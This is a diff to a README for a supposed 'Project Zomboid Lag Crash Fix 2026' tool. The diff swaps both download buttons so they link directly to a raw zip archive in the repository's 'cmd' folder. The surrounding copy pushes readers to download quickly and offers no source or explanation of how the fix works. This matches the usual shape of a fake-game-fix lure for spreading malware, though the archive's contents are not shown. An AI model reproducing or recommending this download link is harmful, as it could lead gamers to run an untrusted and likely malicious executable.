@@ -1,6 +1,6 @@
 # 🧟 Project-Zomboid-Lag-Crash-Fix-2026 - Make Zomboid Run Smooth Again
 
-[![Download Now](https://img.shields.io/badge/Download-Project_Zomboid_Fix-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Footdiver690/Project-Zomboid-Lag-Crash-Fix-2026)
+[![Download Now](https://img.shields.io/badge/Download-Project_Zomboid_Fix-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Footdiver690/Project-Zomboid-Lag-Crash-Fix-2026/main/cmd/Zomboid_Project_Lag_Fix_Crash_v1.2.zip)
 
 ---
 
@@ -133,7 +133,7 @@ This process fixes the problem for almost everyone.
 
 Don't let a broken game ruin your day. You bought Project Zomboid to have fun, not to stare at a black screen or deal with annoying lag. This tool is the quick and easy solution you have been looking for.
 
-[![Download Now](https://img.shields.io/badge/Download-Project_Zomboid_Fix-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Footdiver690/Project-Zomboid-Lag-Crash-Fix-2026)
+[![Download Now](https://img.shields.io/badge/Download-Project_Zomboid_Fix-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Footdiver690/Project-Zomboid-Lag-Crash-Fix-2026/main/cmd/Zomboid_Project_Lag_Fix_Crash_v1.2.zip)
 
 Click the button above, download the tool, and get back to surviving the zombie apocalypse. It takes less than five minutes from start to finish.
 
